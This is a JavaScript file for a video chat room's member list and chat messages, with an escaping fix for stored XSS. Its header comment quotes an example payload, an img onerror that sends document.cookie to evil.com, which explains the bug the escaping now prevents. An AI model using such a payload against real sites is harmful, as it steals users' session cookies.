// =======================
// SECURITY: escape user-controlled strings before inserting into the DOM.
// FIXED: display names and chat messages come straight from other users
// (via RTM attributes / channel messages) and were inserted with
// insertAdjacentHTML with no escaping. A user could set their display
// name to e.g. <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
// and it would execute in every other participant's browser (stored XSS
// across the whole room). All dynamic values are now escaped.
// =======================
let escapeHtml = (str) => {
  const div = document.createElement("div");
  div.textContent = String(str ?? "");
  return div.innerHTML;
};

// =======================
// MEMBER JOIN / LEAVE
// =======================

let handleMemberJoined = async (memberId) => {
  console.log("New member joined:", memberId);

  await addMemberToDom(memberId);

  let members = await channel.getMembers();
  updateMemberTotal(members);

  let { name } = await rtmClient.getUserAttributesByKeys(memberId, ["name"]);
  addBotMessageToDom(`Welcome to the room ${name} 👋`);
};

let handleMemberLeft = async (memberId) => {
  await removeMemberFromDom(memberId);

  let members = await channel.getMembers();
  updateMemberTotal(members);
};

// =======================
// MEMBER DOM HELPERS
// =======================

let addMemberToDom = async (memberId) => {
  let { name } = await rtmClient.getUserAttributesByKeys(memberId, ["name"]);

  let membersWrapper = document.getElementById("member__list");

  // Prevent duplicates
  if (document.getElementById(`member__${memberId}__wrapper`)) return;

  let memberItem = `
    <div class="member__wrapper" id="member__${memberId}__wrapper">
      <span class="green__icon"></span>
      <p class="member_name">${escapeHtml(name)}</p>
    </div>
  `;

  membersWrapper.insertAdjacentHTML("beforeend", memberItem);
};

let removeMemberFromDom = async (memberId) => {
  let memberWrapper = document.getElementById(`member__${memberId}__wrapper`);
  if (!memberWrapper) return;

  let name = memberWrapper.querySelector(".member_name").textContent;
  addBotMessageToDom(`${name} has left the room`);

  memberWrapper.remove();
};

let updateMemberTotal = async (members) => {
  document.getElementById("members__count").innerText = members.length;
};

// =======================
// INITIAL MEMBER LOAD
// =======================

let getMembers = async () => {
  let members = await channel.getMembers();
  updateMemberTotal(members);

  for (let i = 0; i < members.length; i++) {
    await addMemberToDom(members[i]);
  }
};

// =======================
// CHANNEL MESSAGES
// =======================

let handleChannelMessage = async (messageData, memberId) => {
  let data;

  try {
    data = JSON.parse(messageData.text);
  } catch {
    return;
  }

  if (data.type === "chat") {
    addMessageToDom(data.displayName, data.message);
  }

  if (data.type === "user_left") {
    let video = document.getElementById(`user-container-${data.uid}`);
    if (video) video.remove();

    if (userIdInDisplayFrame === `user-container-${data.uid}`) {
      displayFrame.style.display = null;

      let videoFrames = document.getElementsByClassName("video__container");
      for (let i = 0; i < videoFrames.length; i++) {
        videoFrames[i].style.height = "300px";
        videoFrames[i].style.width = "300px";
      }
    }
  }
};

// =======================
// SEND MESSAGE
// =======================

let sendMessage = async (e) => {
  e.preventDefault();

  let message = e.target.message.value.trim();
  if (!message) return;

  await channel.sendMessage({
    text: JSON.stringify({
      type: "chat",
      message: message,
      displayName: displayName,
    }),
  });

  addMessageToDom(displayName, message);
  e.target.reset();
};

document
  .getElementById("message__form")
  .addEventListener("submit", sendMessage);

// =======================
// MESSAGE DOM HELPERS
// =======================

let addMessageToDom = async (name, message) => {
  let messagesWrapper = document.getElementById("messages");

  let newMessage = `
    <div class="message__wrapper">
      <div class="message__body">
        <strong class="message__author">${escapeHtml(name)}</strong>
        <p class="message__text">${escapeHtml(message)}</p>
      </div>
    </div>
  `;

  messagesWrapper.insertAdjacentHTML("beforeend", newMessage);

  let lastMessage = messagesWrapper.lastElementChild;
  if (lastMessage) lastMessage.scrollIntoView();
};

let addBotMessageToDom = async (botMessage) => {
  let messagesWrapper = document.getElementById("messages");

  let newMessage = `
    <div class="message__wrapper">
      <div class="message__body__bot">
        <p class="message__text__bot">${escapeHtml(botMessage)}</p>
      </div>
    </div>
  `;

  messagesWrapper.insertAdjacentHTML("beforeend", newMessage);

  let lastMessage = messagesWrapper.lastElementChild;
  if (lastMessage) lastMessage.scrollIntoView();
};

// =======================
// CLEAN EXIT
// =======================

let leaveChannel = async () => {
  await channel.leave();
  await rtmClient.logout();
};

window.addEventListener("beforeunload", leaveChannel);
